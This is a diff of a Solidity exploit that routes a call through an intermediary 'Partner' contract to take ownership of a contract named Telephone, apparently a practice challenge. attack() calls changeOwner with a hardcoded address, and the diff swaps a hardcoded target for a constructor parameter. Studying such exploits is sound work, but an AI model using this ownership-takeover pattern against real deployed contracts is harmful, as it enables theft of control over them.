@@ -1,11 +1,9 @@
-// SPDX-License-Identifier: MIT
+// SPDX-License-Identifier: Unlicensed
 pragma solidity ^0.6.0;
 
-import './Victim.sol';
+import './Telephone.sol';
 
 contract Attacker {
-  string public txorigin;
-  string public msgowner;
   Partner public partner;
   
 
@@ -19,13 +17,13 @@ contract Attacker {
 
 }
 contract Partner{
-  Victim public victim;
+  Telephone public telephone;
 
-  constructor(address _victimAddress) public {
-    victim = Victim(0x6552Da115Ca3859b3a27764Ac3bE2074085Cd0F8);
+  constructor(address _telephoneAddress) public {
+    telephone = Telephone(_telephoneAddress);
   }
 
   function attack() public {
-    victim.changeOwner();
+    telephone.changeOwner(address(0xcf70e93b75BC5D94652445282DeC2DdaB223Aac1));
   }
 }
